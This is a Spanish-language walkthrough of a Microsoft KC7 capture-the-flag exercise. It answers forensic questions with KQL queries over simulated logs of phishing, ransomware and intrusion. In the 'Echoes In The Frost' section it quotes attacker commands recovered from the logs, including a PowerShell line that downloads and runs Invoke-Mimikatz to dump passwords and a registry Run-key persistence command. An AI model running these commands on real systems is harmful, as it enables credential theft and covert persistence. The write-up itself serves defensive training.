# Act 2 | Microsoft KC7

## Introducción

El Polo Norte se encuentra bajo una amenaza cibernética debido a una serie de ataques lanzados por un grupo identificado como Team Wombley. Entre las tácticas utilizadas por los atacantes se encuentran **campañas de phishing**, **ransomware** y actividades de **espionaje**, generando interrupciones significativas y comprometiendo la seguridad de las operaciones en la región. Este escenario, que simula una crisis real de ciberseguridad, requiere un análisis forense para identificar las vulnerabilidades explotadas y rastrear a los responsables.

En este ejercicio, se provee acceso a logs de telemetría y actividad recopilados en [**Microsoft Azure Sentinel**,](https://learn.microsoft.com/es-es/azure/sentinel/overview?tabs=azure-portal) donde se analizarán mediante el uso de **Kusto Query Language (KQL)**. 

## Sobre KQL

[**KQL**](https://www.notion.so/Act-2-Microsoft-KC7-15f33104c15a800ca9cdc3e772bc3334?pvs=21) es un lenguaje de consulta desarrollado por **Microsoft** para interactuar con grandes volúmenes de datos almacenados. Está diseñado para ser eficiente, sencillo y optimizado, permitiendo analizar, filtrar y visualizar datos en tiempo real.

KQL está inspirado en otros lenguajes de consultas, como SQL, pero con una sintaxis más simplificada. Se especializa en tareas como la exploración de logs, análisis de eventos y detección de patrones en grandes volúmenes de datos estructurados y semi-estructurados.

Algunos de sus usos principales son:

1. Monitoreo y análisis de logs.
2. Identificación de errores, comportamientos sospechosos o patrones específicos en grandes volúmenes de logs.
3. Detección y análisis de indicadores de compromiso y amenazas avanzadas.
4. Visualizaciones (tablas, gráficos, histogramas) para facilitar el análisis de tendencias y correlaciones entre datos.
5. Búsqueda proactiva de amenazas (Threat Hunting) y auditoría de actividades en sistemas.

## Desafíos

### Operation Surrender

En esta fase, **Team Alabaster** llevó a cabo una operación encubierta, y la misión es descubrir sus tácticas. Deberás reunir las pistas y analizar los datos para entender cómo lograron obtener ventaja.

**Pregunta 1**

```sql
surrender
```

**Pregunta 2**

```sql
Email
| where subject contains 'surrender'
```

**Pregunta 3**

```sql
Email
| where sender == 'surrender@northpolemail.com'
| where subject contains 'surrender'
| distinct recipient
| count
```

**Pregunta 4**

```sql
Email
| where sender == 'surrender@northpolemail.com'
| where subject contains 'surrender'
```

Analizando cualquiera de los registros que esta consulta arroja:

```sql
"timestamp": 2024-11-27T14:09:45Z,
"sender": surrender@northpolemail.com,
"reply_to": surrender@northpolemail.com,
"recipient": wombley_cube@santaworkshopgeeseislands.org,
"subject": [EXTERNAL] RE:RE: Official Surrender Notice From Camp AlaBaster,
"verdict": CLEAN,
"link": https://albastersurrender.org/public/share/images/published/Team_Wombley_Surrender.doc
```

Podemos visualizar que en el link que se envía en el email se incluye el documento `Team_Wombley_Surrender.doc` 

**Pregunta 5**

```sql
Employees
| join kind=inner (
    OutboundNetworkEvents
) on $left.ip_addr == $right.src_ip
| where url contains "Team_Wombley_Surrender.doc"
| project name, ip_addr, url, timestamp
| sort by timestamp asc;
```

Esta consulta identifica empleados (`Employees`) cuya dirección IP coincide con eventos de red salientes (`OutboundNetworkEvents`), donde se accedió a una URL que contiene el archivo **"Team_Wombley_Surrender.doc"**. Luego, presenta los resultados con detalles del empleado, IP, URL y el momento en que ocurrió el acceso, ordenado cronológicamente. De ella obtenemos el nombre del primer elfo que abrió el email, que fue *Joyelle Tinseltoe.*

**Pregunta 6**

```sql
let joyelleHostname = Employees
| where name == "Joyelle Tinseltoe"
| project hostname;
ProcessEvents
| where hostname in (joyelleHostname)
| where timestamp between (datetime('2024-11-27T14:11:45') .. datetime('2024-11-27T14:28:45'))
```

La consulta identifica todos los **eventos de procesos** en la tabla `ProcessEvents` asociados al dispositivo (hostname) de **Joyelle Tinseltoe**, dentro de un intervalo de tiempo específico. Esto permite analizar las actividades realizadas en ese dispositivo durante ese período.  Mirando los resultados que arroja, particularmente la columna process_name, se identifica que el archivo que se creó luego de correr el .doc es `keylogger.exe`

**Pregunta 7**

```sql
let flag = "keylogger.exe";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

### Operation Snowfall

En esta etapa, se da inicio a la **Operación Snowfall**, donde se investiga un ataque de **ransomware** perpetrado por **Team Wombley**. El objetivo del ejercicio es identificar y comprender cómo se llevó a cabo el ataque, analizar los logs asociados y detectar los patrones que permitieron su ejecución.

Este ejercicio ofrece una oportunidad para profundizar en el análisis forense de incidentes y fortalecer las habilidades necesarias para responder a amenazas complejas como el ransomware.

**Pregunta 1**

```sql
snowfall
```

**Pregunta 2**

```sql
AuthenticationEvents
| where result == "Failed Login"
| summarize FailedAttempts = count() by username, src_ip, result
| where FailedAttempts >= 5
| sort by FailedAttempts desc
```

La consulta identifica usuarios y direcciones IP con 5 o más intentos fallidos de inicio de sesión, ordenando los resultados por el número de intentos en orden descendente. De los resultados que arroja, vemos que la IP 59.171.58.1 tiene alta cantidad de logins fallidos. 

**Pregunta 3**

```sql
AuthenticationEvents
| summarize FailedAttempts = count() by username, src_ip, result
| where src_ip == "59.171.58.12"
| where result != "Failed Login"
| distinct username
| count
```

Esta consulta:

1. Agrupa y cuenta los eventos de autenticación por nombre de usuario (username), dirección IP de origen (src_ip) y resultado (result).
2. Filtra los resultados para incluir únicamente los eventos provenientes de la IP **59.171.58.12**.
3. Excluye los eventos cuyo resultado sea "Failed Login".
4. Extrae los nombres de usuario únicos que cumplen con las condiciones anteriores.
5. Finalmente, cuenta cuántos usuarios únicos existen en el conjunto de datos resultante (23).

**Pregunta 4**

```sql
AuthenticationEvents
| where result == "Successful Login"
| where src_ip == "59.171.58.12"
| project description
```

Observando la descripción de los logins exitosos, vemos que RDP fue el vector. 

**Pregunta 5**

```sql
let alabasterHostname = Employees
| where name contains "alabaster"
| project hostname;
ProcessEvents
| where hostname in (alabasterHostname)
```

Esta consulta:

1. Busca en la tabla Employees los registros donde el nombre contiene la palabra "alabaster" y extrae los valores del campo hostname.
2. Filtra la tabla ProcessEvents para incluir únicamente los eventos asociados a esos hostnames obtenidos.

Analizando estos eventos es posible visualizar que hay un único comando en el cual un archivo se movió a una dirección externa:

`copy C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip \\wocube\share\alsnowball\Secret_Files.zip`

De allí, obtenemos el nombre de la carpeta robada.

**Pregunta 6**

Con la misma consulta de la Pregunta 5, podemos observar que después de exfiltrar los archivos, el atacante borra los registros de eventos y luego ejecuta `C:\Windows\Users\alsnowball\EncryptEverything.exe.`

**Pregunta 7**

```sql
let flag = "EncryptEverything.exe";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

### Echoes In The Frost

En esta etapa, nos enfrentamos a un adversario desconocido, sofisticado y sigiloso, cuya actividad ha sido detectada únicamente a través de rastros mínimos y fragmentados. Este actor de amenazas ha operado en las sombras, borrando sus huellas y dejando apenas indicios de su presencia.

El objetivo de este ejercicio es analizar las evidencias digitales, identificar patrones ocultos y reconstruir la actividad del atacante. 

**Pregunta 1**

```sql
stay frosty
```

**Pregunta 2**

```sql
Email
| where recipient contains "noel"
| where subject contains "breach"
| sort by timestamp asc
```

Esta consulta busca correos electrónicos relacionados con el término "breach" en el asunto y en el cual quién recibe es "noel", y los presenta en orden cronológico ascendente, lo que facilita analizar la secuencia temporal de los eventos. Analizando los resultados, vemos que el timestamp del primer email fue `2024-12-12T14:48:55Z`

**Pregunta 3**

```sql
let noel_ip = 
Employees
| where name == "Noel Boetie"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (noel_ip)
| where timestamp > datetime(2024-12-12T14:48:55Z)
| sort by timestamp asc
```

Esta consulta identifica los eventos de red salientes asociados a la dirección IP de Noel Boetie después de un tiempo específico, ordenando los resultados de forma cronológica ascendente. De los resultados que arroja, vemos que el timestamp `24-12-12T15:13:55Z` es cuando Noel descargó el archivo incluido en el email de phishing. 

**Pregunta 4**

```sql
PassiveDns
| where domain contains "holidaybargainhunt.io"
| distinct ip
```

La consulta busca las direcciones IP únicas relacionadas con el dominio "holidaybargainhunt.io" en los registros de Passive DNS, eliminando duplicados y mostrando solo los valores únicos. De ella, obtenemos la IP `182.56.23.122`

**Pregunta 5**

Usando la IP obtenida en la consulta anterior:

```sql
AuthenticationEvents
| where src_ip == '182.56.23.122'
```

Se obtiene que se accedió al hostname `WebApp-ElvesWorkshop` .

**Pregunta 6**

```sql
ProcessEvents
| where hostname == 'WebApp-ElvesWorkshop'
| where timestamp >= datetime(2024-11-29T12:25:03Z)
```

Observando los resultados que arroja esta consulta, observamos que en uno de los registros se encuentra el siguiente valor:

```sql
"process_commandline": powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::logonpasswords",
```

De aquí se obtiene que el script usado para obtener las credenciales fue `Invoke-Mimikatz.ps1`

**Pregunta 7**

De los resultados arrojados en la Pregunta 3 sabemos se descargaron 4 archivos específicamente. 

```sql
let noelHostname = Employees
| where name == 'Noel Boetie'
| distinct hostname;
ProcessEvents
| where hostname in (noelHostname)
| where process_commandline has_any ('echo.exe', 'front.7z','clearly.exe','holidaycandy.hta')
```

La consulta identifica eventos de procesos en la tabla ProcessEvents asociados al hostname de Noel Boetie, filtrando aquellos donde el comando del proceso contiene alguno de los términos: 'echo.exe', 'front.7z', 'clearly.exe' o 'holidaycandy.hta'. 

El timestamp más temprano corresponde a la ejecución de echo.exe: `2024-12-12T15:14:38Z`

**Pregunta 8**

Utilizando la misma query de la pregunta 3, obtenemos que holidaycandy.hta se descargó de `compromisedchristmastoys.com`.

**Pregunta 9**

```sql
let noelHostname = Employees
| where name == 'Noel Boetie'
| distinct hostname;
FileCreationEvents
| where hostname in (noelHostname)
| where timestamp >= datetime('2024-12-24T17:19:45Z')
| sort by timestamp asc 
```

Esta consulta muestra los archivos creados en el dispositivo de Noel Boetie después de una fecha y hora específica, ordenados cronológicamente.

**Pregunta 10**

Usando la query de la pregunta 9, podemos ver la línea de comando que configuró la clave de registro:

`New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MS SQL Writer" -Force | New-ItemProperty -Name "frosty" -Value "C:\Windows\Tasks\sqlwriter.exe" -PropertyType String -Force`

Esta incluye el nombre de la propiedad `frosty`.

**Pregunta 11**

```sql
let flag = "frosty";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded

```

## Conclusiones

A lo largo del análisis, se investigaron y documentaron los eventos clave relacionados con la actividad maliciosa en el sistema, utilizando consultas en KQL ****para identificar patrones y rastrear la actividad del atacante. El uso de KQL permitió un análisis detallado de los logs del sistema, facilitando la identificación de las tácticas y herramientas empleadas por los atacantes.